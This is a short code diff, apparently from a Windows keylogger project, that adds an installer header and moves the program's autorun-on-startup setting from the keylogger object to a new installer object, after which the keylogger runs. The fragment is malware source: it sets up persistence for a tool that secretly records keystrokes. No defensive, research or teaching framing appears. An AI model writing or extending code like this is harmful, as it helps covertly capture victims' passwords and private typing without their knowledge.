@@ -2,6 +2,7 @@
 #include "stdafx.h"
 #include "Hax.h"
 #include "Keylogger.h"
+#include "Installer.h"
 
 
 TCHAR semName[] = _T("VSem");
@@ -16,9 +17,9 @@ int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCm
 		return 0;
 	}
 
-	keylogger.SetAutorun(true);
+	installer.SetAutorun(true);
 #ifdef _DEBUG
-	keylogger.SetAutorun(false);
+	installer.SetAutorun(false);
 #endif
 	keylogger.Run();
 
